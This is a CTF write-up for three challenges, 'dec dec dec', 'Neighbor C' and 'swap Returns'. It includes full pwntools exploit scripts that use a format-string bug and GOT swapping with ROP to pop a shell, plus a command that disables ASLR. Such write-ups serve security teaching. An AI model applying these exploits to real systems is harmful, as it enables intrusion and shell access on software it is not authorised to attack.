## dec dec dec

The first encode is base64

```c
_BYTE *__fastcall base64(const char *a1)
{
  unsigned int v1; // ST1C_4
  int v2; // ST2C_4
  _BYTE *v3; // rax
  _BYTE *v4; // ST30_8
  _BYTE *v5; // rax
  _BYTE *v6; // rax
  int v7; // ST24_4
  _BYTE *v8; // rax
  _BYTE *v9; // ST30_8
  _BYTE *v10; // rax
  _BYTE *v11; // rax
  unsigned int v12; // ST1C_4
  _BYTE *v13; // rax
  _BYTE *v14; // ST30_8
  _BYTE *v15; // rax
  _BYTE *v16; // rax
  signed int i; // [rsp+10h] [rbp-80h]
  unsigned int v19; // [rsp+14h] [rbp-7Ch]
  _BYTE *v20; // [rsp+30h] [rbp-60h]
  _BYTE *v21; // [rsp+38h] [rbp-58h]
  __int64 v22; // [rsp+40h] [rbp-50h]
  __int64 v23; // [rsp+48h] [rbp-48h]
  __int64 v24; // [rsp+50h] [rbp-40h]
  __int64 v25; // [rsp+58h] [rbp-38h]
  __int64 v26; // [rsp+60h] [rbp-30h]
  __int64 v27; // [rsp+68h] [rbp-28h]
  __int64 v28; // [rsp+70h] [rbp-20h]
  __int64 v29; // [rsp+78h] [rbp-18h]
  char v30; // [rsp+80h] [rbp-10h]
  unsigned __int64 v31; // [rsp+88h] [rbp-8h]

  v31 = __readfsqword(0x28u);
  v22 = 'HGFEDCBA';
  v23 = 'PONMLKJI';
  v24 = 'XWVUTSRQ';
  v25 = 'fedcbaZY';
  v26 = 'nmlkjihg';
  v27 = 'vutsrqpo';
  v28 = '3210zyxw';
  v29 = '/+987654';
  v30 = 0;
  v19 = strlen(a1);
  v21 = malloc(4 * v19 / 3 + 1);
  v20 = v21;
  for ( i = 0; i < (signed int)(v19 - v19 % 3); i += 3 )
  {
    v1 = (a1[i + 1] << 8) + (a1[i] << 16) + a1[i + 2];
    v2 = a1[i + 2] & 0x3F;
    v3 = v20;
    v4 = v20 + 1;
    *v3 = *((_BYTE *)&v22 + ((v1 >> 18) & 0x3F));
    v5 = v4++;
    *v5 = *((_BYTE *)&v22 + ((v1 >> 12) & 0x3F));
    *v4 = *((_BYTE *)&v22 + ((v1 >> 6) & 0x3F));
    v6 = v4 + 1;
    v20 = v4 + 2;
    *v6 = *((_BYTE *)&v22 + v2);
  }
  if ( v19 % 3 == 1 )
  {
    v7 = 16 * a1[i] & 0x3F;
    v8 = v20;
    v9 = v20 + 1;
    *v8 = *((_BYTE *)&v22 + (((unsigned int)(a1[i] << 16) >> 18) & 0x3F));
    v10 = v9++;
    *v10 = *((_BYTE *)&v22 + v7);
    *v9 = '=';
    v11 = v9 + 1;
    v20 = v9 + 2;
    *v11 = '=';
  }
  else if ( v19 % 3 == 2 )
  {
    v12 = (a1[i] << 16) + (a1[i + 1] << 8);
    v13 = v20;
    v14 = v20 + 1;
    *v13 = *((_BYTE *)&v22 + ((v12 >> 18) & 0x3F));
    v15 = v14++;
    *v15 = *((_BYTE *)&v22 + ((v12 >> 12) & 0x3F));
    *v14 = *((_BYTE *)&v22 + ((v12 >> 6) & 0x3F));
    v16 = v14 + 1;
    v20 = v14 + 2;
    *v16 = 61;
  }
  *v20 = 0;
  return v21;
}
```

the second encode is some rotate

```c
char *__fastcall rot(char *a1)
{
  int v1; // ST1C_4
  char *s; // [rsp+8h] [rbp-28h]
  char v4; // [rsp+1Bh] [rbp-15h]
  char *v5; // [rsp+20h] [rbp-10h]
  char *v6; // [rsp+28h] [rbp-8h]

  s = a1;
  v1 = strlen(a1);
  v6 = (char *)malloc((unsigned int)(v1 + 1));
  v5 = v6;
  while ( *s )
  {
    v4 = *s;
    if ( *s > 0x40 && v4 <= 'Z' )
    {
      *v5 = (v4 - '4') % 26 + 'A';
    }
    else if ( v4 > '`' && v4 <= 'z' )
    {
      *v5 = (v4 - 'T') % 26 + 'a';
    }
    else
    {
      *v5 = *s;
    }
    ++v5;
    ++s;
  }
  *v5 = 0;
  return v6;
}
```

The third encode, well, I don't know what's that. According to my test, the first byte is a checksum, and each 4 bytes from the remaining bytes correspond to 3 bytes from input, so we can brute force crack it.

```c
char* res = "@25-Q44E233=,>E-M34=,,$LS5VEQ45)M2S-),7-$/3T ";
unsigned char buf[128];
int main(int argc, char *argv[])
{
	unsigned int* ures = (unsigned int*)(res + 1);
	for (int i = 0; i < 11; ++i)
	{
		//printf("%d: \n", i);
		for (int c = 0; c < 0x1000000; ++c)
		{
			char* tmp1 = rot((char*)&c);
			unsigned char* tmp2 = (unsigned char*)trans((unsigned char*)tmp1);
			//puts(tmp2);
			//puts(ures + i);
			if (*(unsigned int*)(tmp2 + 1) == ures[i])
			{
				//printf("%d found", i);
				printf("%s", (char*)&c);
			}
			free(tmp1);
			free(tmp2);
		}
	}
	return 0;
}
```

## Neighbor C

The program is simple, a format string vuln

```c
void __fastcall __noreturn sub_8D0(FILE *stderr)
{
  while ( fgets(format, 256, stdin) )
  {
    fprintf(stderr, format);
    sleep(1u);
  }
  exit(1);
}
```

However, the stderr is not redirected to the socket, so the leak is currently not available

My approach is to rewrite the `fd` field of `stderr`, it is initially 2, and if we can rewrite it to 1, it will essentially becomes a stdout.

There are two value in the stack pointing to the `stderr`, `6$` and `8$`, in which `6$` can be editted since it is not used anymore. Firstly we need to rewrite a saved `rbp` value using `rbp` chain to let it point to the pointer to `stderr`, and edit the pointer to let it point to its fd field, then rewrite that to `1`. To be specific, write `%9$hhn` to change `11$` to pointer to pointer to `stderr`, then write `%11$hhn` to let it points to fd, then `%6$hhn` to change the `fd` to `stdout`

However, for the saved rbp values, which are pointers of stack, the value of LSB is uncertain unlike other pages, but the last 4 bits are always zero to ensure the alignment. Thus, the probability of success is `1/16`, which is acceptable.

```
Please tell me about yourself. I must talk about you to our mayor.
%9$p
0x7ffd5d257ca0
Please tell me about yourself. I must talk about you to our mayor.
%9$p
0x7ffeaa4289e0
Please tell me about yourself. I must talk about you to our mayor.
%9$p
0x7ffe77564440
```

We can disable ALSR to make our debugging more convinient: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`

After changing the bytes to stdout, we can leak everything. The way to getshell is then not hard, attack `_FILE_IO`, or return address of `fprintf`, whatever u what. What I did is rewrite the return address to `one_gadget`, but before that we need to do some preparation(write `NULL` for requirement of `one_gadget`, write pointers to saved return address of `fprintf` on stack) first.

the exp:

```python
from pwn import *

g_local=True
context.log_level='debug'
UNSORTED_OFF = 0x3c4b78
IO_STR_FINISH = 0x3C37B0
GUESSED_STDERR_POS = 0x28
GUESSED_NEEDNULL_POS = (0x58 - 0x28) + GUESSED_STDERR_POS
GUESSED_FPRINTF_RET_POS = (0x18 - 0x28) + GUESSED_STDERR_POS
GUESSED_BUF_POS = (0x68 - 0x28) + GUESSED_STDERR_POS
#14 15 16 for format $

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./neighbor_c')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	gdb.attach(sh)
else:
	sh = remote("neighbor.chal.ctf.westerns.tokyo", 37565)
	e = ELF("./libc.so.6")
	ONE_GADGET_OFF = 0x4557a

def slp():
	if g_local:
		sleep(0.1)
	else:
		sleep(1.1)

def hhn(pos, val):
	assert val < 0x100
	if val == 0:
		return "%" + str(pos) + "$hhn"
	else:
		return "%" + str(val) + "c%" + str(pos) + "$hhn"

def hn(pos, val):
	assert val < 0x10000
	if val == 0:
		return "%" + str(pos) + "$hn"
	else:
		return "%" + str(val) + "c%" + str(pos) + "$hn"

def once(payload):
	sh.send(payload + "\n")
	slp()
	return sh.recv(timeout=0.1)

def stack_hn(rel_pos, val):
	once(hhn(9, rel_pos))
	once(hn(11, val))

def write_addr(rel_pos, val):
	stack_hn(rel_pos, val & 0xffff)
	stack_hn(rel_pos + 2, (val >> 0x10) & 0xffff)
	stack_hn(rel_pos + 4, (val >> 0x20) & 0xffff)

def cont_shoot(poses, vals, extra):
	assert len(poses) == len(vals)
	size = len(poses)
	ret = ""
	i = 0
	cur_size = 0
	next_overflow = 0
	while i < size:
		assert next_overflow >= cur_size
		num = next_overflow - cur_size + vals[i]
		if num < 0x10000:
			ret += hn(poses[i], num)
			next_overflow += 0x10000
		else:
			num = vals[i] - (cur_size - (next_overflow - 0x10000))
			assert num >= 0
			ret += hn(poses[i], num)
		cur_size += num
		i += 1
	return ret

sh.recvuntil("Please tell me about yourself. I must talk about you to our mayor.\n")

once(hhn(9, GUESSED_STDERR_POS))
once(hhn(11, (e.symbols["_IO_2_1_stderr_"] & 0xff) + 0x70))
once(hhn(6, 1))
# now stderr is already stdout, u can leak everything

if once("test") != "test\n":
	quit(1)

write_addr(GUESSED_NEEDNULL_POS, 0)
#for 0x30 one_gadget

stack_addr = int(once("%9$lx"), 16)
libc_addr = int(once("%8$lx"), 16) - e.symbols["_IO_2_1_stderr_"]
print hex(libc_addr)
print hex(stack_addr)

write_addr(GUESSED_BUF_POS, stack_addr - 0x50 + 0x18)
write_addr(GUESSED_BUF_POS + 8, stack_addr - 0x50 + 0x1A)
write_addr(GUESSED_BUF_POS + 0x10, stack_addr - 0x50 + 0x1C)
#14 15 16 for format $ to rewrite ret addr of fprintf

one_gadget = libc_addr + ONE_GADGET_OFF

once(cont_shoot([14,15,16],[one_gadget & 0xffff, (one_gadget >> 0x10) & 0xffff, one_gadget >> 0x20], ""))

sh.interactive()
```

## swap Returns

the program is simple, we can swap the `QWORD` given 2 addresses. The first thing that comes in my mind is to swap the `GOT table`, but the only useful part seems to be swap the `atoi` and `printf`, thus we can leak the stack address using `%p`.

The problem is that we can control almost nothing on the stack, 2 pointers that must be used for swapping, 2 bytes which is not enough to do anything. Here is where I got stucked. Then I inspect the stack and `.data` to find something useful to swap, then I found `0x400700`, which is the entry point, on the stack. Thus, if we swap the `exit` with this entry point, we can rerun the program each time we call `exit`. In this way we can shift the stack up, at the same time the values of that 2 pointers is remained on the stack, which are controllable.

Therefore, we can call set and exit for multiple times, and then call swap to swap those data to construct a ROP chain, then swap `printf` with a gadget that is putted in the stack beforehand, then call `printf` to execute our ROP.

What I did is to do it in 2 steps, in the first step I leak the libc address, and return to main function, in the second step I call `system("/bin/sh")` to getshell

Initially I want to call read directly, however, there is no `pop rdx`, so I used this 2-step way.

exp:

```python
from pwn import *

g_local=True
context.log_level='debug'

p = ELF("./swap_returns")
START_OFF = -6 + 0x90
ADD_RSP_0x38 = 0x400a46
POP_RDI_RET = 0x400a53
POP_RSI_R15_RET = 0x400a51
MAIN = 0x4008E9

if g_local:
	e = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	sh = process('./swap_returns')#env={'LD_PRELOAD':'./libc.so.6'}
	ONE_GADGET_OFF = 0x4526a
	gdb.attach(sh)
else:
	sh = remote("swap.chal.ctf.westerns.tokyo", 37567)
	e = ELF("./libc.so.6")
	ONE_GADGET_OFF = 0x4557a

def set_pointers(addr1, addr2):
	sh.send("1\n")
	sh.recvuntil("1st address: \n")
	sh.send(str(addr1) + "\n")
	sh.recvuntil("2nd address: \n")
	sh.send(str(addr2) + "\n")
	sh.recvuntil("Your choice: \n")

def swap():
	sh.send("2\n")
	sh.recvuntil("Your choice: \n")

def exit():
	sh.send("3\n")
	sh.recvuntil("Your choice: \n")

def invalid_choice():
	sh.send("4\n")
	sh.recvuntil("Your choice: \n")

#leak stack addr---------------------------

invalid_choice()
#make sure dl resolve being called

set_pointers(p.got["atoi"], p.got["printf"])
swap()

sh.send("%p")
stack_leak = sh.recvuntil("0x")
stack_addr = int(sh.recv(12), 16)
print hex(stack_addr)


#recover atoi and printf-------------------------
sh.recvuntil("Your choice: \n")
sh.send("A") # strlen = 1, so set pointer

sh.recvuntil("1st address: \n")
sh.send(str(p.got["atoi"]) + "\n")
sh.recvuntil("2nd address: \n")
sh.send(str(p.got["printf"]) + "\n")
sh.recvuntil("Your choice: \n")

sh.send("AA") # strlen = 2, so swap
sh.recvuntil("Your choice: \n")

#replace exit with _start-------------------------
set_pointers(stack_addr + START_OFF, p.got["_exit"])
swap()
#now call exit to raise the stack


#fill stack & construct ROP----------------------
def fill_stack(data):
	assert len(data) == 0x10
	set_pointers(u64(data[:8]), u64(data[8:]))
	exit()

rop = p64(POP_RDI_RET)
rop += p64(p.got["puts"])
rop += p64(p.plt["puts"])
rop += p64(MAIN)
rop += p64(ADD_RSP_0x38)
rop += p64(0)
# rdx is 0, and no pop rdx, so failed
# rop += p64(POP_RDI_RET)
# rop += p64(0)
# rop += p64(POP_RSI_R15_RET)
# rop += p64(stack_addr - ) #todo
# rop += p64(ADD_RSP_0x38)
# rop += p64(p.plt["read"])
# rop += "gadget\x00\x00" #to be filled

i = len(rop) - 0x10
while i >= 0:
	fill_stack(rop[i:i+0x10])
	i -= 0x10

#sh.interactive()

fst_data = stack_addr - 0x1f6
print hex(fst_data)
#0x110 for each, totally len(rop)/0x10
#-0x53e is the stack when printf being called

printf_rsp = stack_addr - 0x31e
rop_dst = printf_rsp + 0x38
print hex(rop_dst)

for i in xrange(0, len(rop)/0x10):
	set_pointers(fst_data + 0x110 * i, rop_dst + 0x10 * i)
	swap()
	set_pointers(fst_data + 0x110 * i + 8, rop_dst + 0x10 * i + 8)
	swap()

add_rsp = rop_dst + 0x20
set_pointers(add_rsp, p.got["printf"])
swap()

sh.send("3\n")
#rop will call main again, with return address being printf
leak = sh.recvuntil("\x7f\n")
libc_addr = u64(leak[:6] + "\x00\x00") - e.symbols["puts"]

print hex(libc_addr)
sh.recvuntil("Your choice: \n")

set_pointers(add_rsp, p.got["printf"])
swap()
#swap printf back

rop2 = p64(POP_RDI_RET)
rop2 += p64(libc_addr + next(e.search("/bin/sh\x00")))
rop2 += p64(libc_addr + e.symbols["system"])
rop2 += p64(0)

i = len(rop2) - 0x10
while i >= 0:
	print rop2[i:i+0x10]
	fill_stack(rop2[i:i+0x10])
	i -= 0x10

fst_data = stack_addr - 0x406
print hex(fst_data)
#0x110 for each, totally len(rop)/0x10
#-0x53e is the stack when printf being called

printf_rsp = stack_addr - 0x52e
rop_dst = printf_rsp + 0x38
print hex(rop_dst)

for i in xrange(0, len(rop2)/0x10):
	set_pointers(fst_data + 0x118 * i, rop_dst + 0x10 * i)
	swap()
	set_pointers(fst_data + 0x118 * i + 8, rop_dst + 0x10 * i + 8)
	swap()
	#interval becomes 0x118, not sure why,
	#maybe there is a stack adjustment in _libc_start_main
	#the ROP that returns to the main breaks the alignment,
	#so that it will adjust alignment and change this distance?

set_pointers(add_rsp, p.got["printf"])
swap()

sh.interactive()
```

